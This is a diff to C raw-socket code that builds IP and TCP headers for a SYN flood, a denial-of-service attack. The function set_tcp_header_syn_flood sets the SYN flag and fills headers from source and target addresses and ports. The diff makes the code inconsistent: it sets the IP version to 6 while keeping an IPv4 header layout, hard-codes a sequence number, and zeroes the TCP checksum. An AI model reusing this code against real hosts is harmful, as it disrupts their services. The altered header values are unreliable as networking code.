@@ -15,7 +15,7 @@ int get_socket_descriptor(){
 	return fd;
 }
 void set_ip_header(IP_HEADER* ip_hdr,char* source_address,char* remote_address){
-	ip_hdr->version = 4;
+	ip_hdr->version = 6;
 	ip_hdr->ihl     = 5;
 // Se podría establecer preferencia de tráfico con esto, pero está deprecated //
 	ip_hdr->tos     = 0; 
@@ -30,11 +30,12 @@ void set_ip_header(IP_HEADER* ip_hdr,char* source_address,char* remote_address){
 	ip_hdr->checksum         = 0;
 	ip_hdr->source_address   = string_addr(source_address);
 	ip_hdr->remote_address   = string_addr(remote_address);
+	ip_hdr->optional = 0;
 }
 void set_tcp_header_syn_flood(TCP_HEADER* tcp_hdr,char* source_port,char* remote_port,char* buffer){
 	tcp_hdr->source_port  = string_htons(source_port);
 	tcp_hdr->remote_port  = string_htons(remote_port);
-	tcp_hdr->num_sequence = 0;
+	tcp_hdr->num_sequence = 1339;
 	tcp_hdr->ack_number   = 0;
 	tcp_hdr->offset       = 5;
 	tcp_hdr->reserved     = 0;
@@ -46,8 +47,8 @@ void set_tcp_header_syn_flood(TCP_HEADER* tcp_hdr,char* source_port,char* remote
 	tcp_hdr->flag_rst     = 0;
 	tcp_hdr->flag_syn     = 1; // ;)
 	tcp_hdr->flag_fin     = 0;
-	tcp_hdr->window       = 65535; // 2^16bits -> ventana de congestión = 16 bits
-	tcp_hdr->checksum     = checksum((unsigned short*)buffer,(sizeof(IP_HEADER) + sizeof(TCP_HEADER)));
+	tcp_hdr->window       = 65535;; // 2^16bits -> ventana de congestión = 16 bits
+	tcp_hdr->checksum     = 0;//checksum((unsigned short*)buffer,(sizeof(IP_HEADER) + sizeof(TCP_HEADER)));
 	tcp_hdr->urg_pointer  = 0;	
 }
 
